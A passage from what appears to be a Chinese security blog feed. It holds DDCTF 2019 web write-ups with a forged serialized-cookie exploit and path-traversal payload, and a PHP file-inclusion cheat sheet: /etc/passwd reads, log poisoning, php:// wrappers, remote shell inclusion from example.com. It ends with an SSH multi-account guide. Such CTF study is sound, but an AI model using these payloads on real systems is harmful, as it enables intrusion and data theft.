text"></p><p>将对象属性设置为2<br><code>O:4:&quot;Test&quot;:2:{s:10:&quot;%00Test%00file&quot;;s:4:&quot;flag&quot;;}</code><br><img src="/img/1555860082394.png" alt="Alt text"><br>成功控制file变量输出flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01.前言&quot;&gt;&lt;/a&gt;0x01.前言&lt;/h2&gt;&lt;p&gt;做国赛ctf，遇到一个绕过点感觉挺有价值的，主要是通过CVE-2016-7124进行绕过。&lt;br&gt;影
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF-2019-WEB-部分wp</title>
    <link href="http://yoursite.com/2019/04/19/DDCTF-2019-web-%E9%83%A8%E5%88%86wp/"/>
    <id>http://yoursite.com/2019/04/19/DDCTF-2019-web-部分wp/</id>
    <published>2019-04-19T04:16:21.000Z</published>
    <updated>2019-05-13T12:45:30.126Z</updated>
    
    <content type="html"><![CDATA[<h2 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h2><p>进入题目，看到url<code>http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code><br>类型base64字符串<br>进行两次base64解码，得到16进制代码，进行ascii转换<br><img src="/img/1555385072651.png" alt="Alt text"><br>可以看到结果为flag.jpg，得到jpg的编码方案<br>写脚本如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">text = input(&quot;请输入字符串：&quot;)</span><br><span class="line">l = len(text)</span><br><span class="line">text_ascii = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(0,l):</span><br><span class="line">text_ascii += str(hex(ord(text[i]))[2:])</span><br><span class="line"></span><br><span class="line">text_base64 = base64.b64encode(base64.b64encode(text_ascii.encode(&apos;utf-8&apos;)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = &quot;http://117.51.150.246/index.php?jpg=&quot; + text_base64.decode(&apos;utf-8&apos;)</span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure></p><p>尝试读取index.php内容，可以发现结果输出在src内，base64解码得到相应源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span><br><span class="line"> * Date: July 4,2018</span><br><span class="line"> */</span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(&apos;content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">if(! isset($_GET[&apos;jpg&apos;]))</span><br><span class="line">    header(&apos;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&apos;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&apos;jpg&apos;])));</span><br><span class="line">echo &apos;&lt;title&gt;&apos;.$_GET[&apos;jpg&apos;].&apos;&lt;/title&gt;&apos;;</span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);</span><br><span class="line">echo $file.&apos;&lt;/br&gt;&apos;;</span><br><span class="line">$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);</span><br><span class="line">echo $file.&apos;&lt;/br&gt;&apos;;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot;.$txt.&quot;&apos;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">/*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"> */</span><br></pre></td></tr></table></figure></p><p>有一个地方比较脑洞就是，flag file文件是在practice.txt.swp中泄露的<img src="/img/1555385479582.png" alt="Alt text"><br>因而可以通过构造<code>f1agconfigddctf.php</code>得到f1ag!ddctf.php的源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">include(&apos;config.php&apos;);</span><br><span class="line">$k = &apos;hello&apos;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    if($uid==$content)</span><br><span class="line">&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo&apos;hello&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>extract函数可以将键名变为变量，从而达到变量覆盖，file_get_contents值可以用php://input进行控制，所以可以构造如下<br><img src="/img/1555386142202.png" alt="Alt text"></p><h2 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h2><p>访问index.php<br><img src="/img/1555342566364.png" alt="Alt text"><br>查看源码<br><img src="/img/1555342588191.png" alt="Alt text"><br>查看js文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: didi</span><br><span class="line"> * Date: 2019/1/13</span><br><span class="line"> * Time: 9:05 PM</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">function auth() &#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;post&quot;,</span><br><span class="line">        url:&quot;http://117.51.158.44/app/Auth.php&quot;,</span><br><span class="line">        contentType: &quot;application/json;charset=utf-8&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        beforeSend: function (XMLHttpRequest) &#123;</span><br><span class="line">            XMLHttpRequest.setRequestHeader(&quot;didictf_username&quot;, &quot;&quot;);</span><br><span class="line">        &#125;,</span><br><span class="line">        success: function (getdata) &#123;</span><br><span class="line">           console.log(getdata);</span><br><span class="line">           if(getdata.data !== &apos;&apos;) &#123;</span><br><span class="line">               document.getElementById(&apos;auth&apos;).innerHTML = getdata.data;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,error:function(error)&#123;</span><br><span class="line">            console.log(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>是一个ajax，自动向服务器请求，    并带上didictf_username头。<br>burpsuit抓包，将请求头添加admin字段<br><img src="/img/1555342991534.png" alt="Alt text"><br>返回数据<br><img src="/img/1555343818269.png" alt="Alt text"><br>得到对应目录，访问得到源码<br>Application.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Class Application &#123;</span><br><span class="line">    var $path = &apos;&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function response($data, $errMsg = &apos;success&apos;) &#123;</span><br><span class="line">        $ret = [&apos;errMsg&apos; =&gt; $errMsg,</span><br><span class="line">            &apos;data&apos; =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(&apos;Content-type: application/json&apos;);</span><br><span class="line">        echo $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function auth() &#123;</span><br><span class="line">        $DIDICTF_ADMIN = &apos;admin&apos;;</span><br><span class="line">        if(!empty($_SERVER[&apos;HTTP_DIDICTF_USERNAME&apos;]) &amp;&amp; $_SERVER[&apos;HTTP_DIDICTF_USERNAME&apos;] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            $this-&gt;response(&apos;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&apos;);</span><br><span class="line">            return TRUE;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;response(&apos;抱歉，您没有登陆权限，请获取权限后访问-----&apos;,&apos;error&apos;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    private function sanitizepath($path) &#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(&apos;../&apos;,&apos;&apos;,$path);</span><br><span class="line">    $path=str_replace(&apos;..\\&apos;,&apos;&apos;,$path);</span><br><span class="line">    return $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function __destruct() &#123;</span><br><span class="line">    if(empty($this-&gt;path)) &#123;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $path = $this-&gt;sanitizepath($this-&gt;path);</span><br><span class="line">        if(strlen($path) !== 18) &#123;</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;response($data=file_get_contents($path),&apos;Congratulations&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Session.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">include &apos;Application.php&apos;;</span><br><span class="line">class Session extends Application &#123;</span><br><span class="line"></span><br><span class="line">    //key建议为8位字符串</span><br><span class="line">    var $eancrykey                  = &apos;&apos;;</span><br><span class="line">    var $cookie_expiration= 7200;</span><br><span class="line">    var $cookie_name                = &apos;ddctf_id&apos;;</span><br><span class="line">    var $cookie_path= &apos;&apos;;</span><br><span class="line">    var $cookie_domain= &apos;&apos;;</span><br><span class="line">    var $cookie_secure= FALSE;</span><br><span class="line">    var $activity                   = &quot;DiDiCTF&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">if(parent::auth()) &#123;</span><br><span class="line">            $this-&gt;get_key();</span><br><span class="line">            if($this-&gt;session_read()) &#123;</span><br><span class="line">                $data = &apos;DiDI Welcome you %s&apos;;</span><br><span class="line">                $data = sprintf($data,$_SERVER[&apos;HTTP_USER_AGENT&apos;]);</span><br><span class="line">                parent::response($data,&apos;sucess&apos;);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;session_create();</span><br><span class="line">                $data = &apos;DiDI Welcome you&apos;;</span><br><span class="line">                parent::response($data,&apos;sucess&apos;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function get_key() &#123;</span><br><span class="line">        //eancrykey  and flag under the folder</span><br><span class="line">        $this-&gt;eancrykey =  file_get_contents(&apos;../config/key.txt&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function session_read() &#123;</span><br><span class="line">        if(empty($_COOKIE)) &#123;</span><br><span class="line">        return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[$this-&gt;cookie_name];</span><br><span class="line">        if(!isset($session)) &#123;</span><br><span class="line">            parent::response(&quot;session not found&quot;,&apos;error&apos;);</span><br><span class="line">            return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)-32);</span><br><span class="line">        $session = substr($session,0,strlen($session)-32);</span><br><span class="line"></span><br><span class="line">        if($hash !== md5($this-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            parent::response(&quot;the cookie data not match&quot;,&apos;error&apos;);</span><br><span class="line">            return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if(!is_array($session) OR !isset($session[&apos;session_id&apos;]) OR !isset($session[&apos;ip_address&apos;]) OR !isset($session[&apos;user_agent&apos;]))&#123;</span><br><span class="line">            return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!empty($_POST[&quot;nickname&quot;])) &#123;</span><br><span class="line">            $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey);</span><br><span class="line">            $data = &quot;Welcome my friend %s&quot;;</span><br><span class="line">            foreach ($arr as $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            parent::response($data,&quot;Welcome&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if($session[&apos;ip_address&apos;] != $_SERVER[&apos;REMOTE_ADDR&apos;]) &#123;</span><br><span class="line">            parent::response(&apos;the ip addree not match&apos;.&apos;error&apos;);</span><br><span class="line">            return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        if($session[&apos;user_agent&apos;] != $_SERVER[&apos;HTTP_USER_AGENT&apos;]) &#123;</span><br><span class="line">            parent::response(&apos;the user agent not match&apos;,&apos;error&apos;);</span><br><span class="line">            return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        return TRUE;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function session_create() &#123;</span><br><span class="line">        $sessionid = &apos;&apos;;</span><br><span class="line">        while(strlen($sessionid) &lt; 32) &#123;</span><br><span class="line">            $sessionid .= mt_rand(0,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = array(</span><br><span class="line">            &apos;session_id&apos; =&gt; md5(uniqid($sessionid,TRUE)),</span><br><span class="line">            &apos;ip_address&apos; =&gt; $_SERVER[&apos;REMOTE_ADDR&apos;],</span><br><span class="line">            &apos;user_agent&apos; =&gt; $_SERVER[&apos;HTTP_USER_AGENT&apos;],</span><br><span class="line">            &apos;user_data&apos; =&gt; &apos;&apos;,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = $this-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            $this-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            $this-&gt;cookie_path,</span><br><span class="line">            $this-&gt;cookie_domain,</span><br><span class="line">            $this-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = new Session();</span><br><span class="line">$ddctf-&gt;index();</span><br></pre></td></tr></table></figure></p><p>代码主要将用户数组进行序列化与秘钥做哈希值存储在cookie中，可以进行读取<br>这题考点主要是反序列化漏洞，主要在于绕过哈希值的检验<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($hash !== md5($this-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            parent::response(&quot;the cookie data not match&quot;,&apos;error&apos;);</span><br><span class="line">            return FALSE;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>那么就要想办法获取秘钥<br><img src="/img/1555379865472.png" alt="Alt text"><br>可以将nickname传入%s，在sprintf第二次赋值的时候，就能够将秘钥进行读取。<br>从而获得秘钥：EzblrbNS<br>有了秘钥就可以进行构造对象来注入<br>这是我构造的对象，文件读取漏洞的过滤通过拼接两个../就能绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;Session&quot;:8:&#123;s:9:&quot;eancrykey&quot;;s:0:&quot;&quot;;s:17:&quot;cookie_expiration&quot;;i:7200;s:11:&quot;cookie_name&quot;;s:8:&quot;ddctf_id&quot;;s:11:&quot;cookie_path&quot;;s:0:&quot;&quot;;s:13:&quot;cookie_domain&quot;;s:0:&quot;&quot;;s:13:&quot;cookie_secure&quot;;b:0;s:8:&quot;activity&quot;;s:7:&quot;DiDiCTF&quot;;s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>通过秘钥合并session数组并得到其哈希值，拼接后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;Session&quot;:8:&#123;s:9:&quot;eancrykey&quot;;s:0:&quot;&quot;;s:17:&quot;cookie_expiration&quot;;i:7200;s:11:&quot;cookie_name&quot;;s:8:&quot;ddctf_id&quot;;s:11:&quot;cookie_path&quot;;s:0:&quot;&quot;;s:13:&quot;cookie_domain&quot;;s:0:&quot;&quot;;s:13:&quot;cookie_secure&quot;;b:0;s:8:&quot;activity&quot;;s:7:&quot;DiDiCTF&quot;;s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;&#125;639015ac868c5bf47765758fba32c3b1</span><br></pre></td></tr></table></figure></p><p>通过将cookie进行修改，提交即可获得flag<br><img src="/img/1555341460234.png" alt="Alt text"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;滴&quot;&gt;&lt;a href=&quot;#滴&quot; class=&quot;headerlink&quot; title=&quot;滴~&quot;&gt;&lt;/a&gt;滴~&lt;/h2&gt;&lt;p&gt;进入题目，看到url&lt;code&gt;http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRa
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞小结</title>
    <link href="http://yoursite.com/2019/03/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/03/31/文件包含漏洞/</id>
    <published>2019-03-31T10:32:18.000Z</published>
    <updated>2019-05-13T12:45:50.095Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>如果客户可以将恶意参数动态地添加到包含函数中，会导致恶意代码执行，敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。<br>常见函数有：include()、require()<br>区别：</p><ol><li>include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行</li><li>require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</li></ol><p>require一般是用于文件头包含类文件、数据库等等文件，include一般是用于包含html模板文件<br>include_once()、require_once()与(include\require)的功能相同,只是区别于当重复调用的时候，它只会调用一次。</p><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><ol><li><p>包含目录文件<br>?file=test.txt<br>如果里面的内容是php，则内容会被当成php执行,不是php则会读取到文件内容(用来读取/etc/passw等等配置文件的敏感信息)</p><p> ?file=./../../test.txt<br> <code>./</code>当前目录，<code>../</code>上一级目录，这样的遍历目录来读取文件</p></li><li><p>包含日志文件<br>无法上传文件的时候,可以尝试利用UA插入payload到日志文件,然后包含容器的日志文件(错误、访问文件都行),注意：选择凌晨包含最好,payload后面加一个exit()退出程序,以防大日志导致浏览器卡死,如果包含不成功,也许是open_basedir限制了目录<br>常见几个路径<br>/var/log/apache/access_log<br>/var/www/logs/access_log<br><img src="/img/1553776213389.png" alt="Alt text"></p></li><li><p>包含session文件<br>session文件一般在/tmp目录下，格式为sess_[phpsessid]</p></li><li><p>利用php流filter(过滤器，可以用来读取php文件内容，不需要开启allow_url_include)<br>?file=php://filter/convert.base64-encode/resource=index.php</p></li></ol><h2 id="本地文件包含小姿势"><a href="#本地文件包含小姿势" class="headerlink" title="本地文件包含小姿势"></a>本地文件包含小姿势</h2><p>审计中可以见这样的包含模板文件：<br><code>&lt;?php include(&quot;inc/&quot; . $_GET[&#39;file&#39;] . &quot;.htm&quot;); ?&gt;</code></p><ol><li>%00截断<br> /etc/passwd%00<br> （需要magic_quotes_gpc=off，PHP小于5.3.4有效）</li></ol><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><ol><li>远程代码执行<br>?file=[http|https|ftp]://example.com/shell.txt<br>(需要allow_url_fopen=On并且 allow_url_include=On)</li><li>利用php流input(接收POST过来的值)<br>?file=php://input<br>(需要allow_url_include=On)</li><li>利用data URIs<br>?file=data://text/plain;base64,base64编码的payload<br>(需要allow_url_include=On)</li></ol><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><ol><li>phar伪协议<br>?file=phar://test.jpg/test.php<br>利用方法，先新建一个php文件，然后在php文件中写入phpinfo，然后进行压缩为zip文件，重命名为jpg文件，然后进行phar包含</li><li>zip伪协议<br>?file=zip://C:/www/K4ge/CodeAduit/1000/include/test.jpg%23test.php<br>必须使用绝对路径</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;如果客户可以将恶意参数动态地添加到包含函数中，会导致恶意代码执行，敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。&lt;br&gt;常见函数
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>同一台电脑连接多个github仓库</title>
    <link href="http://yoursite.com/2019/02/03/%E5%90%8C%E4%B8%80%E5%8F%B0%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E5%A4%9A%E4%B8%AAgithub%E4%BB%93%E5%BA%93/"/>
    <id>http://yoursite.com/2019/02/03/同一台电脑连接多个github仓库/</id>
    <published>2019-02-03T08:42:16.000Z</published>
    <updated>2019-05-13T12:46:30.686Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-生成密钥"><a href="#0x01-生成密钥" class="headerlink" title="0x01.生成密钥"></a>0x01.生成密钥</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;yourname@email.com&quot;</span><br></pre></td></tr></table></figure><p>分别生成两次公钥，可以得到两组公钥和私钥</p><h2 id="0x02-在github上添加公钥"><a href="#0x02-在github上添加公钥" class="headerlink" title="0x02. 在github上添加公钥"></a>0x02. 在github上添加公钥</h2><p>不解释</p><h2 id="0x03-添加config配置文件"><a href="#0x03-添加config配置文件" class="headerlink" title="0x03. 添加config配置文件"></a>0x03. 添加config配置文件</h2><p>在.ssh文件夹下添加config文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#第一个账号 Bu1uokage</span><br><span class="line">Host github.com</span><br><span class="line">HostName github.com</span><br><span class="line">User git</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line"></span><br><span class="line">#第二个账号 K4ge</span><br><span class="line">Host K4ge</span><br><span class="line">HostName github.com</span><br><span class="line">User git</span><br><span class="line">IdentityFile ~/.ssh/id_rsa_K4ge</span><br></pre></td></tr></table></figure></p><p>说明：</p><ol><li>Host 可以是自定义的随机别名，如<code>K4ge</code>，在后面clone时会用到</li><li>Hostname 就默认配置就好</li><li>User默认就使用git就好</li><li>IdentityFile即公钥对应目录</li></ol><h2 id="0x04-SSH连接"><a href="#0x04-SSH连接" class="headerlink" title="0x04. SSH连接"></a>0x04. SSH连接</h2><p>如果出现Could not open a connection to your authentication agent错误。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-agent bash</span><br></pre></td></tr></table></figure></p><p>可以使用上述命令解决</p><p>添加ssh到agent中，<code>ssh-add -D</code>将agent中的删除，然后再依次添加。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-add id_rsa</span><br><span class="line">ssh-add id_rsa_K4ge</span><br><span class="line">ssh-add -l</span><br></pre></td></tr></table></figure></p><p>测试连接远程github服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span 